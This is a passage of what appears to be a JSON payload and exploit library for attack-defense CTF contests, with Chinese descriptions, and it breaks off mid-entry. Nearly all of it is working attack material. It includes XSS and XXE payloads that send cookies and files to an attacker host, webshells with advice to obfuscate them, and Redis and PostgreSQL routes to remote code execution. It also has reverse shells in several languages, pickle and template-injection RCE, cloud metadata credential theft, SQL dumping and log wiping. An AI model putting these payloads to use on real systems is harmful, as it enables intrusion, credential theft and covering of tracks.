+   "body": "%0d%0aSet-Cookie:%20admin=1\n%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK\n%0aSet-Cookie:%20a=1\n%E5%98%8A%E5%98%8DSet-Cookie:%20a=1      # UTF-8 宽字符绕过\n%0d%0a%0d%0a<script>alert(1)</script>\n# 常见点\n?url=  ?next=  ?filename=  ?redirect=  ?callback="
+  },
+  {
+   "id": "payload-multi-smtp",
+   "title": "邮件头注入 / SMTP 注入",
+   "language": "mixed",
+   "category": "crlf",
+   "description": "联系表单拼接 From/To 时可注入额外收件人或 BCC，用于钓鱼与外带。",
+   "body": "test@a.com%0d%0aBcc:attacker@evil.com\ntest@a.com%0d%0aSubject:%20pwned\ntest@a.com%0a%0a<html>phishing</html>\n# SMTP 命令注入\nhelo x\nmail from:<a@b>\nrcpt to:<victim@target>\ndata\nSubject: hi\n.\nquit"
+  },
+  {
+   "id": "payload-multi-open-redirect",
+   "title": "开放重定向绕过清单",
+   "language": "mixed",
+   "category": "open-redirect",
+   "description": "跳转白名单常只校验前缀/域名包含，用这些变体绕过。",
+   "body": "?next=https://evil.com\n?next=//evil.com\n?next=/\\evil.com\n?next=https:evil.com\n?next=https://target.com.evil.com\n?next=https://evil.com#target.com\n?next=https://evil.com?target.com\n?next=////evil.com\n?next=%2f%2fevil.com\n?next=//evil.com/%2e%2e/\n?next=https://target.com@evil.com"
+  },
+  {
+   "id": "payload-multi-graphql",
+   "title": "GraphQL: 内省与注入",
+   "language": "mixed",
+   "category": "graphql",
+   "description": "先内省拿 schema，再找未授权字段、批量查询与 SQL/NoSQL 注入点。",
+   "body": "# 内省\n{__schema{types{name fields{name args{name}}}}}\n# 单字段探测\n{__typename}\n# 批量绕过限流\n[{query:\"{a}\"},{query:\"{b}\"}]\n# 注入\n{user(id:\"1' or '1'='1\"){name}}\n{user(id:\"1) { name } #\"){name}}\n# 别名批量爆破登录\nmutation{m1:login(u:\"admin\",p:\"1\")m2:login(u:\"admin\",p:\"2\")}"
+  },
+  {
+   "id": "payload-multi-race",
+   "title": "竞态条件: 并发利用骨架",
+   "language": "mixed",
+   "category": "race-condition",
+   "description": "优惠券、余额、限次接口用单包多请求（HTTP/2 单连接）最容易打中。",
+   "body": "# 1) 单包多请求（turbo intruder / 自写 raw socket）\n# 2) 并发脚本\nimport asyncio,aiohttp\nasync def hit(s,i):\n    async with s.post(URL,data={'coupon':'X'}) as r: print(i,r.status)\nasync def main():\n    async with aiohttp.ClientSession() as s:\n        await asyncio.gather(*[hit(s,i) for i in range(50)])\nasyncio.run(main())\n# 3) 观察点：余额、库存、限次、文件写入、验证码校验\n# 4) 子状态技巧：先 GET 再 POST，保证同时到达"
+  },
+  {
+   "id": "payload-multi-smuggle",
+   "title": "HTTP 请求走私原始包",
+   "language": "mixed",
+   "category": "request-smuggling",
+   "description": "前端与后端对 CL/TE 解析不一致时可用；先 CL.TE，再 TE.CL，再 TE.TE 混淆。",
+   "body": "# CL.TE\nPOST / HTTP/1.1\nHost: TARGET\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED\n# TE.CL\nPOST / HTTP/1.1\nHost: TARGET\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0\n\n# TE.TE 混淆\nTransfer-Encoding: chunked\nTransfer-Encoding: x\nTransfer-Encoding : chunked\nTransfer-Encoding:\\tchunked"
+  },
+  {
+   "id": "payload-multi-xss-polyglot",
+   "title": "XSS 通用 polyglot 与上下文适配",
+   "language": "mixed",
+   "category": "xss",
+   "description": "一个 payload 打通多种上下文，配合无交互外带。",
+   "body": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e\n# 属性内\n\" onmouseover=\"alert(1)\n' onfocus='alert(1)' autofocus='\n# script 内\n</script><svg onload=alert(1)>\n';alert(1);//\n# href 内\njavascript:alert(1)\n# 外带 cookie\n<script>new Image().src='http://ATTACKER/?c='+document.cookie</script>\n<img src=x onerror=\"fetch('http://ATTACKER/?c='+document.cookie)\">"
+  },
+  {
+   "id": "payload-multi-sqli-waf",
+   "title": "SQLi WAF 绕过语法变体",
+   "language": "mixed",
+   "category": "sqli",
+   "description": "关键字被拦时换等价语法，注释/内联注释/大小写/编码轮着上。",
+   "body": "/*!50000union*/ /*!50000select*/ 1,2,3\nunion%0aselect 1,2,3\nuNiOn SeLeCt 1,2,3\nunion(select(1),2,3)\n1/**/or/**/1=1\n1 or 1 like 1\n1 || 1=1\n# 等价函数\nsubstr→mid→substring→left\nascii→ord\nconcat→concat_ws→group_concat\nsleep→benchmark→heavy query\n# 空格\n%09 %0a %0b %0c %0d %a0 /**/ ()\n# 引号\n0x61646d696e  char(97,100,109,105,110)"
+  },
+  {
+   "id": "payload-multi-xxe-param",
+   "title": "XXE: 参数实体 OOB 模板",
+   "language": "mixed",
+   "category": "xxe",
+   "description": "无回显时的标准套路：外部 DTD + 参数实体 + 带外通道。",
+   "body": "<?xml version=\"1.0\"?>\n<!DOCTYPE r [\n  <!ENTITY % remote SYSTEM \"http://ATTACKER/e.dtd\">\n  %remote;\n  %int;\n  %trick;\n]>\n<r>&send;</r>\n# e.dtd\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://ATTACKER/?p=%file;'>\">\n# 换行截断时改用 FTP\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://ATTACKER:2121/%file;'>\">"
+  },
+  {
+   "id": "payload-multi-upload-svg",
+   "title": "文件上传: SVG / HTML / PDF 利用",
+   "language": "mixed",
+   "category": "upload",
+   "description": "图片白名单里常漏 SVG，可直接 XSS 或配合 SSRF。",
+   "body": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>\n<svg><script>alert(1)</script></svg>\n<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"http://169.254.169.254/latest/meta-data/\"/></svg>\n# HTML 直接上传\n<html><body><script>fetch('http://ATTACKER/?c='+document.cookie)</script></body></html>\n# PDF 内嵌 JS\n/OpenAction << /S /JavaScript /JS (app.alert(1)) >>\n# 文件名 XSS\n\"><svg onload=alert(1)>.png"
+  },
+  {
+   "id": "payload-multi-template-include",
+   "title": "模板包含 / 服务端模板路径穿越",
+   "language": "mixed",
+   "category": "lfi",
+   "description": "模板引擎按名加载文件时可用 ../ 或绝对路径读任意文件。",
+   "body": "?tpl=../../../../etc/passwd\n?tpl=/etc/passwd\n?tpl=php://filter/convert.base64-encode/resource=index\n?view=..%2f..%2f..%2fetc%2fpasswd\n# Twig/Freemarker 动态 include\n{{include(template_from_string(\"{{7*7}}\"))}}\n<#include \"/etc/passwd\">"
+  },
+  {
+   "id": "payload-multi-h2",
+   "title": "H2 数据库控制台 / JDBC 利用",
+   "language": "mixed",
+   "category": "rce",
+   "description": "H2 常随 Spring Boot 测试依赖带出，控制台无口令即可执行 Java。",
+   "body": "# 访问控制台\n/h2-console\njdbc:h2:mem:test\n# 建别名执行命令\nCREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\\\\\A\"); return s.hasNext() ? s.next() : \"\"; }';\nCALL EXEC('id');\n# JDBC URL 侧利用\njdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://ATTACKER/x.sql'"
+  },
+  {
+   "id": "payload-multi-redis",
+   "title": "Redis 未授权: 写文件 / 主从 / 计划任务",
+   "language": "mixed",
+   "category": "rce",
+   "description": "6379 未授权时三条主路：写 webshell、写 crontab、主从复制加载模块。",
+   "body": "redis-cli -h TARGET\nconfig set dir /var/www/html\nconfig set dbfilename x.php\nset x \"<?php @eval($_POST[1]);?>\"\nsave\n# crontab\nconfig set dir /var/spool/cron\nconfig set dbfilename root\nset x \"\\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\\n\"\nsave\n# 主从复制 RCE\nredis-cli -h TARGET slaveof ATTACKER 6379\nredis-rogue-server.py --rhost TARGET --lhost ATTACKER\n# SSH 公钥\nconfig set dir /root/.ssh\nset x \"\\n\\nssh-rsa AAAA...\\n\\n\"\nconfig set dbfilename authorized_keys\nsave"
+  },
+  {
+   "id": "payload-multi-mysql-udf",
+   "title": "MySQL 写文件与 UDF 提权",
+   "language": "mixed",
+   "category": "rce",
+   "description": "有 FILE 权限就能读文件；secure_file_priv 为空时可写 shell 或 UDF。",
+   "body": "select @@version, @@secure_file_priv, current_user();\nselect load_file('/etc/passwd');\nselect '<?php eval($_POST[1]);?>' into outfile '/var/www/html/x.php';\nselect unhex('3c3f706870...') into dumpfile '/var/www/html/x.php';\n# UDF\nselect unhex('7f454c46...') into dumpfile '/usr/lib/mysql/plugin/x.so';\ncreate function sys_eval returns string soname 'x.so';\nselect sys_eval('id');\n# 提权（MySQL 以 root 跑）\n# 常见：mysql.user 里改 plugin 为 mysql_native_password 换口令"
+  },
+  {
+   "id": "payload-multi-postgres-copy",
+   "title": "PostgreSQL 命令执行与读写",
+   "language": "mixed",
+   "category": "rce",
+   "description": "COPY ... TO PROGRAM 需要超级用户；普通用户可试大对象与 lo_export。",
+   "body": "copy (select '') to program 'id > /tmp/o';\ncopy (select '') to program 'bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"';\ncreate table x(t text); copy x from program 'cat /etc/passwd';\n# 读文件\nselect pg_read_file('/etc/passwd');\n# 写文件\ncopy (select '<?php eval($_POST[1]);?>') to '/var/www/html/x.php';\n# 大对象\nselect lo_import('/etc/passwd');\nselect lo_export(lo_creat(0), '/tmp/x');"
+  },
+  {
+   "id": "payload-multi-mongo",
+   "title": "MongoDB 未授权导出与利用",
+   "language": "mixed",
+   "category": "nosqli",
+   "description": "27017 无认证时直接 dump；JS 引擎开启时可服务端执行。",
+   "body": "mongo TARGET:27017\nshow dbs\nuse app\ndb.getCollectionNames()\ndb.users.find().pretty()\n# 导出\nmongoexport --host TARGET -d app -c users --out users.json\n# 服务端 JS\ndb.users.find({$where:\"sleep(100)\"})\ndb.users.find({$where:\"function(){return this.user=='admin'}\"})\n# 写文件（老版本）\ndb.users.insert({a:{$eval:...}})"
+  },
+  {
+   "id": "payload-multi-k8s",
+   "title": "容器 / K8s API 利用",
+   "language": "mixed",
+   "category": "rce",
+   "description": "容器内先看 token 与挂载，再打 apiserver 或 Docker socket。",
+   "body": "cat /var/run/secrets/kubernetes.io/serviceaccount/token\nenv | grep -i kube\n# 列 pod\ncurl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default/api/v1/namespaces/default/pods\n# 建特权 pod 挂宿主\nkubectl --token=$TOKEN create -f evil.yaml\n# Docker socket\ncurl --unix-socket /var/run/docker.sock http://x/containers/json\ndocker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt sh"
+  },
+  {
+   "id": "payload-multi-webshell-min",
+   "title": "极简 Webshell 家族（多语言）",
+   "language": "mixed",
+   "category": "rce",
+   "description": "短小、低特征，适合绕过上传内容检测；记得改连接密码与混淆。",
+   "body": "<?php @eval($_POST['a']);?>\n<?php assert($_REQUEST['a']);?>\n<?=`{$_GET['a']}`;?>\n<?php $a='ass'.'ert';$a($_POST['a']);?>\n<%@ Page Language=\"C#\"%><%System.Diagnostics.Process.Start(\"/bin/sh\",\"-c \"+Request[\"c\"]);%>\n<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>\n<%\n  String c = request.getParameter(\"c\");\n  Process p = Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",c});\n  java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter(\"\\\\A\");\n  out.print(s.hasNext()?s.next():\"\");\n%>\n# Node\nrequire('http').createServer((q,s)=>s.end(require('child_process').execSync(q.url.slice(2)+''))).listen(31337)"
+  },
+  {
+   "id": "payload-multi-fix-check",
+   "title": "修复自检: 验证补丁是否真的生效",
+   "language": "mixed",
+   "category": "info-leak",
+   "description": "AWD 修完必须回归验证，否则被同一 payload 二次打穿要扣分。",
+   "body": "# 1) SQLi 修复验证：原 payload 应报错或无结果\n1' and 1=1--+   →  与 1' and 1=2--+  返回应一致\n# 2) 命令执行：注入点应无输出\n;id   $(id)   `id`\n# 3) 文件包含：非白名单路径应被拒\n?file=../../../../etc/passwd\n?file=/etc/passwd\n# 4) 上传：危险扩展应被拒（含双扩展、大小写、%00）\nx.php  x.php.jpg  x.PHP  x.php%00.jpg\n# 5) 反序列化：非法数据应抛异常而非执行\nO:8:\"stdClass\":0:{}   {\"__proto__\":{\"x\":1}}\n# 6) XSS：输出应被转义\n<script>alert(1)</script>  \"><svg onload=alert(1)>\n# 7) 越权：换低权限账号访问同接口应 403"
+  },
+  {
+   "id": "payload-multi-flag-hunt",
+   "title": "Flag 定位与读取（AWD 抢分）",
+   "language": "mixed",
+   "category": "info-leak",
+   "description": "AWD 的 flag 通常在固定目录轮换，抢到即得分；先看进程与挂载缩小范围。",
+   "body": "find / -maxdepth 4 -iname '*flag*' 2>/dev/null\nls -la /flag /flag.txt /root/flag* /tmp/flag* 2>/dev/null\ncat /proc/1/cmdline | tr '\\0' ' '\nmount | grep -Ei 'flag|secret'\nenv | grep -i flag\n# 常见位置\n/flag  /flag.txt  /root/flag  /home/*/flag  /tmp/flag  /var/www/flag.php\n/var/www/html/flag.php\n# 通过 Web 读\ncurl 'http://TARGET/flag.php'\ncurl 'http://TARGET/?file=/flag'\n# 数据库里\nmysql -e 'select * from flag' 2>/dev/null"
+  },
+  {
+   "id": "payload-multi-log-clean",
+   "title": "日志与痕迹清理（复盘用）",
+   "language": "mixed",
+   "category": "info-leak",
+   "description": "AWD 里清理只影响对抗复盘，不要动比赛平台的计分文件；仅在自己的靶机上操作。",
+   "body": "# Web 访问日志\n> /var/log/nginx/access.log\n> /var/log/apache2/access.log\n# 自己的 shell 与临时文件\nrm -f /tmp/x.php /tmp/sess_* /tmp/.a\n# 上传的 webshell\nfind /var/www -name '*.php' -newermt '-2 hour' 2>/dev/null\n# 注意：不要删除平台 flag / 计分脚本"
+  }
+ ],
+ "exploits": [
+  {
+   "id": "exploit-bash",
+   "title": "Bash Reverse Shell",
+   "language": "php",
+   "description": "Linux 基础反弹，命令执行场景先试。",
+   "body": "/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
+  },
+  {
+   "id": "exploit-busybox",
+   "title": "BusyBox nc 反弹",
+   "language": "php",
+   "description": "很多容器题里只有 busybox。",
+   "body": "busybox nc ATTACKER_IP 4444 -e /bin/sh"
+  },
+  {
+   "id": "exploit-php-fsockopen",
+   "title": "PHP fsockopen 反弹",
+   "language": "php",
+   "description": "适合有 PHP 执行但没有 bash 的环境。",
+   "body": "php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+  },
+  {
+   "id": "exploit-php-webshell",
+   "title": "PHP 一句话后门",
+   "language": "php",
+   "description": "题目允许写文件时可快速落地。",
+   "body": "<?php system($_GET['cmd']); ?>"
+  },
+  {
+   "id": "exploit-python-oneliner",
+   "title": "Python One-liner Reverse Shell",
+   "language": "python",
+   "description": "Python 环境最常见的单行反弹。",
+   "body": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
+  },
+  {
+   "id": "exploit-python-http-ssrf",
+   "title": "Python SSRF 二次打点",
+   "language": "python",
+   "description": "利用 SSRF 继续探测本地服务。",
+   "body": "http://127.0.0.1:5000/debug\nhttp://localhost:8080/actuator/env\ngopher://127.0.0.1:6379/_info%0d%0a"
+  },
+  {
+   "id": "exploit-python-pickle-loader",
+   "title": "Python Pickle 投递",
+   "language": "python",
+   "description": "拿到 base64 反序列化点时直接投递。",
+   "body": "import base64,pickle,os\nclass R:\n    def __reduce__(self):\n        return (os.system,('cat /flag',))\nprint(base64.b64encode(pickle.dumps(R())).decode())"
+  },
+  {
+   "id": "exploit-node-reverse",
+   "title": "Node Reverse Shell",
+   "language": "nodejs",
+   "description": "Node 命令执行环境首选。",
+   "body": "node -e \"var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect(4444,'ATTACKER_IP',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});\""
+  },
+  {
+   "id": "exploit-node-proto-rce",
+   "title": "Node 原型污染到 RCE",
+   "language": "nodejs",
+   "description": "先污染，再寻找 child_process / eval 链。",
+   "body": "{\"__proto__\":{\"shell\":\"/bin/sh\",\"argv0\":\"/bin/sh\",\"NODE_OPTIONS\":\"--require /proc/self/environ\"}}"
+  },
+  {
+   "id": "exploit-java-runtime",
+   "title": "Java Runtime.exec",
+   "language": "java",
+   "description": "模板注入或反序列化拿到表达式执行后常用。",
+   "body": "Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"});"
+  },
+  {
+   "id": "exploit-java-processbuilder",
+   "title": "Java ProcessBuilder",
+   "language": "java",
+   "description": "Spring / OGNL / EL 题里更稳。",
+   "body": "new ProcessBuilder(\"/bin/sh\",\"-c\",\"cat /flag\").start();"
+  },
+  {
+   "id": "exploit-go-reverse",
+   "title": "Go Reverse Shell 片段",
+   "language": "go",
+   "description": "命令执行点可直接编译或注入。",
+   "body": "package main\nimport(\"net\";\"os/exec\")\nfunc main(){c,_:=net.Dial(\"tcp\",\"ATTACKER_IP:4444\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}"
+  },
+  {
+   "id": "exploit-go-http-smuggle",
+   "title": "Go 内网打点 / Redis Gopher",
+   "language": "go",
+   "description": "SSRF 场景常配合 gopher、dict、file。",
+   "body": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a\ndict://127.0.0.1:6379/info"
+  },
+  {
+   "id": "exploit-php-file-write",
+   "title": "PHP 文件写 WebShell",
+   "language": "php",
+   "description": "拿到文件写入点后，优先落一个最小后门验证权限。",
+   "body": "file_put_contents('shell.php','<?php @system($_POST[\"x\"]);?>');\ncopy('php://input','shell.php');"
+  },
+  {
+   "id": "exploit-python-flask-debug",
+   "title": "Python Flask Debug Console",
+   "language": "python",
+   "description": "调试入口暴露时先探 PIN，再直接执行。",
+   "body": "/console\nimport os; os.popen('id').read()\n__import__('os').popen('cat /flag').read()"
+  },
+  {
+   "id": "exploit-python-ssti-readflag",
+   "title": "Python SSTI 读 Flag",
+   "language": "python",
+   "description": "Jinja2 成功执行后先读文件再拿命令回显。",
+   "body": "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}\n{{request.application.__globals__.__builtins__.__import__('subprocess').check_output('id',shell=True)}}"
+  },
+  {
+   "id": "exploit-java-jsp-webshell",
+   "title": "Java JSP WebShell",
+   "language": "java",
+   "description": "Archive Slip 或任意文件写入后快速落地。",
+   "body": "<%@ page import=\"java.io.*\" %><%\nString cmd=request.getParameter(\"cmd\");\nif(cmd!=null){Process p=Runtime.getRuntime().exec(cmd);InputStream in=p.getInputStream();int a=-1;while((a=in.read())!=-1){out.print((char)a);} }\n%>"
+  },
+  {
+   "id": "exploit-java-jndi-rce",
+   "title": "Java JNDI / LDAP 探测",
+   "language": "java",
+   "description": "适合老链路或出网环境下的探测。",
+   "body": "${jndi:ldap://ATTACKER_IP:1389/a}\nldap://ATTACKER_IP:1389/Basic/Command/Base64/Y2F0IC9mbGFn"
+  },
+  {
+   "id": "exploit-node-ejs-rce",
+   "title": "Node EJS RCE",
+   "language": "nodejs",
+   "description": "模板执行成功后直接拿命令输出。",
+   "body": "<%= global.process.mainModule.require('child_process').execSync('cat /flag').toString() %>\n<%= global.process.mainModule.require('child_process').execSync('id').toString() %>"
+  },
+  {
+   "id": "exploit-node-jwt-admin",
+   "title": "Node JWT 提权",
+   "language": "nodejs",
+   "description": "弱密钥或 none 时直接造管理员票据。",
+   "body": "header={\"alg\":\"HS256\",\"typ\":\"JWT\"}\npayload={\"sub\":\"admin\",\"role\":\"admin\",\"iat\":1710000000}\nsecret=secret|123456|jwtsecret"
+  },
+  {
+   "id": "exploit-go-zip-slip",
+   "title": "Go ZipSlip 落地",
+   "language": "go",
+   "description": "压缩包任意写文件场景可直接落 WebShell 或公钥。",
+   "body": "entry=../../../../var/www/html/shell.php\ncontent=<?php system($_GET['cmd']); ?>\nentry=../../../../root/.ssh/authorized_keys"
+  },
+  {
+   "id": "exploit-php-fpm-gopher",
+   "title": "PHP-FPM 未授权 → RCE（gopher 打 9000）",
+   "language": "php",
+   "description": "SSRF 或本地可达 9000 时，构造 FastCGI 报文直接执行 PHP，不依赖文件落地。",
+   "body": "python3 fpm.py -c '<?php system(\"id\");?>' -p 9000 127.0.0.1 /var/www/html/index.php\n# SSRF 版本（gopher 报文需自己生成）\n?url=gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00...\n# 关键参数\nSCRIPT_FILENAME=/var/www/html/index.php\nPHP_VALUE=auto_prepend_file=php://input\nPHP_ADMIN_VALUE=allow_url_include=On"
+  },
+  {
+   "id": "exploit-php-session-lfi-chain",
+   "title": "session.upload_progress + LFI 一条链",
+   "language": "php",
+   "description": "从写 session 到包含执行，全流程脚本骨架。",
+   "body": "import requests, threading\nurl='http://TARGET/upload.php?file=/tmp/sess_pwn'\ndef write():\n    f={'PHP_SESSION_UPLOAD_PROGRESS':(None,'<?=system($_GET[1]);?>'),\n       'f':('a.txt','x'*1000)}\n    requests.post('http://TARGET/upload.php',files=f,cookies={'PHPSESSID':'pwn'})\ndef hit():\n    while True:\n        r=requests.get(url+'&1=id',cookies={'PHPSESSID':'pwn'})\n        if 'uid=' in r.text: print(r.text); break\nthreading.Thread(target=write).start(); hit()"
+  },
+  {
+   "id": "exploit-php-write-shell",
+   "title": "PHP 任意文件写入 → 拿 shell",
+   "language": "php",
+   "description": "file_put_contents / fwrite 可控内容与路径时直接写；不可控路径时先穿越。",
+   "body": "file_put_contents('/var/www/html/x.php','<?php @eval($_POST[1]);?>');\nfile_put_contents('../../www/x.php','<?php @eval($_POST[1]);?>');\n# 用 session 写入再包含\nsession_start(); $_SESSION['c']='<?php @eval($_POST[1]);?>';\n# 用 error_log 写\nerror_log('<?php @eval($_POST[1]);?>',3,'/var/www/html/x.php');"
+  },
+  {
+   "id": "exploit-php-unserialize-chain",
+   "title": "PHP 反序列化: 快速找链流程",
+   "language": "php",
+   "description": "没有现成链时，按入口点 + 魔术方法 + 可控属性三步走。",
+   "body": "# 1) 找入口\ngrep -rn 'unserialize(' . --include=*.php\n# 2) 找魔术方法\ngrep -rn '__destruct\\|__wakeup\\|__toString\\|__call\\|__invoke' . --include=*.php\n# 3) 生成\nphp -r 'echo urlencode(serialize(new Evil()));'\n# 4) 常用现成链（按框架版本）\nThinkPHP 5.1.x  → think\\process\\pipes\\Windows::__destruct\nLaravel 5.8-9   → PendingBroadcast / Dispatcher\nMonolog         → FingersCrossedHandler\nGuzzle          → FnStream::__destruct"
+  },
+  {
+   "id": "exploit-python-flask-pin",
+   "title": "Flask debug 控制台 PIN 计算",
+   "language": "python",
+   "description": "开了 debug 的 Werkzeug 控制台只要算出 PIN 就能执行任意代码。",
+   "body": "# 需要的量：username、modname、getattr(app,'__name__')、app 文件路径、MAC\npython3 -c \"\nimport hashlib\nfrom itertools import chain\nprobably_public_bits=['root','flask.app','Flask','/usr/local/lib/python3.8/site-packages/flask/app.py']\nprivate_bits=['252','969c3b6d-...']\nh=hashlib.md5()\nfor b in chain(probably_public_bits,private_bits): h.update(str(b).encode()); h.update(b'cookiesalt')\nnum=''.join(f'{x:x}' for x in h.digest())[:12]\nprint(num)\n\"\n# MAC 从 /sys/class/net/eth0/address 取十进制，machine-id 从 /etc/machine-id"
+  },
+  {
+   "id": "exploit-python-pickle-session",
+   "title": "Python pickle 会话伪造",
+   "language": "python",
+   "description": "Flask/Django 用 pickle 存 session 时，改 cookie 即 RCE。",
+   "body": "import pickle,base64,os\nclass E:\n    def __reduce__(self): return (os.system,('id',))\nprint(base64.urlsafe_b64encode(pickle.dumps(E())).decode())\n# Flask 签名版：需要 SECRET_KEY（常泄露在 config/.env）\nfrom flask.sessions import SecureCookieSessionInterface\n# 用 flask-unsign 爆破/伪造\nflask-unsign --decode --cookie '<cookie>'\nflask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt"
+  },
+  {
+   "id": "exploit-python-ssti-flag",
+   "title": "Python SSTI 读 flag（一条命令）",
+   "language": "python",
+   "description": "AWD 场景优先读 flag 而不是反弹 shell。",
+   "body": "{{lipsum.__globals__['os'].popen('cat /flag* 2>/dev/null;find / -maxdepth 3 -name \"flag*\"').read()}}\n{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}\n{{''.__class__.__mro__[1].__subclasses__()[N]('/flag').read()}}"
+  },
+  {
+   "id": "exploit-python-deser-cookie",
+   "title": "Python 反序列化: 常见入口清单",
+   "language": "python",
+   "description": "pickle/yaml/jsonpickle 都可能出现在 cookie、缓存、队列里。",
+   "body": "# 入口排查\ngrep -rn 'pickle.loads\\|yaml.load\\|jsonpickle.decode\\|dill.loads\\|torch.load' .\n# 测试\ncookie=profile=gASV...\n# 缓存（redis）\nredis-cli get session:xxx | python3 -c 'import sys,pickle;pickle.loads(sys.stdin.buffer.read())'"
+  },
+  {
+   "id": "exploit-node-proto-rce2",
+   "title": "Node 原型污染打 EJS 模板",
+   "language": "nodejs",
+   "description": "污染 settings['view options'] 后所有 render 都会执行注入代码。",
+   "body": "{\"__proto__\":{\"client\":true,\"escapeFunction\":\"1;return global.process.mainModule.require('child_process').execSync('id');\"}}\n# 触发\nres.render('index')\n# 验证污染\ncurl 'http://TARGET/api/x' -d '{\"__proto__\":{\"polluted\":1}}'\ncurl 'http://TARGET/api/check'   →  {\"polluted\":1}"
+  },
+  {
+   "id": "exploit-node-redos",
+   "title": "Node ReDoS / 正则注入",
+   "language": "nodejs",
+   "description": "用户可控正则时构造灾难性回溯，打满 CPU 拖垮服务（AWD 可用作压制手段）。",
+   "body": "new RegExp(userInput)  →  传 (a+)+$\n^(([a-z])+.)+[A-Z]([a-z])+$\n# 检测\ncurl -m 5 'http://TARGET/?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaa!'\n# 修复：转义 + 长度限制 + RE2"
+  },
+  {
+   "id": "exploit-node-ssrf-redis",
+   "title": "Node SSRF 打 Redis（CRLF 注入）",
+   "language": "nodejs",
+   "description": "http 客户端允许 CRLF 时，把 GET 请求变成 Redis 命令。",
+   "body": "http://127.0.0.1:6379/%0d%0aSET%20x%20%22%3C%3Fphp%20eval(%24_POST%5B1%5D)%3B%3F%3E%22%0d%0aCONFIG%20SET%20dir%20/var/www/html%0d%0aCONFIG%20SET%20dbfilename%20x.php%0d%0aSAVE%0d%0a\n# gopher 版\ngopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A"
+  },
+  {
+   "id": "exploit-node-file-read",
+   "title": "Node 任意文件读取 → 读配置拿密钥",
+   "language": "nodejs",
+   "description": "读 .env / config 拿到 SECRET_KEY、数据库口令，比拿 shell 更快得分。",
+   "body": "?file=../../.env\n?file=../config/default.json\n?file=/proc/self/environ\n?file=/proc/self/cmdline\n# 拿到 SECRET_KEY 后伪造 session\nflask-unsign --sign --cookie '{\"user\":\"admin\"}' --secret '<key>'"
+  },
+  {
+   "id": "exploit-go-ssrf-metadata",
+   "title": "Go SSRF 打元数据拿临时凭据",
+   "language": "go",
+   "description": "云上靶机常挂 IAM 角色，拿到 AK/SK 就能横向。",
+   "body": "curl 'http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\ncurl 'http://TARGET/fetch?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/'\n# 拿到后\nexport AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...\naws s3 ls"
+  },
+  {
+   "id": "exploit-go-tpl-rce",
+   "title": "Go text/template 注入执行命令",
+   "language": "go",
+   "description": "能控模板字符串且注入了自定义函数（如 exec）时直接调用。",
+   "body": "{{.Exec \"cat /flag\"}}\n{{.ReadFile \"/etc/passwd\"}}\n{{printf \"%s\" (env \"PATH\")}}\n# 探测\n{{7*7}}"
+  },
+  {
+   "id": "exploit-go-sql-dump",
+   "title": "Go 应用 SQL 注入拖库脚本",
+   "language": "go",
+   "description": "确认注入后按库→表→列→数据四步拖，注意请求频率别把自己打挂。",
+   "body": "# 1) 库名\n' union select database(),2,3-- \n# 2) 表名\n' union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database()-- \n# 3) 列名\n' union select group_concat(column_name),2,3 from information_schema.columns where table_name='users'-- \n# 4) 数据\n' union select group_concat(username,0x3a,password),2,3 from users-- "
+  },
+  {
+   "id": "exploit-java-shiro",
+   "title": "Shiro rememberMe 反序列化",
+   "language": "java",
+   "description": "Shiro < 1.2.4 默认硬编码密钥，检测到 rememberMe=deleteMe 就可以打。",
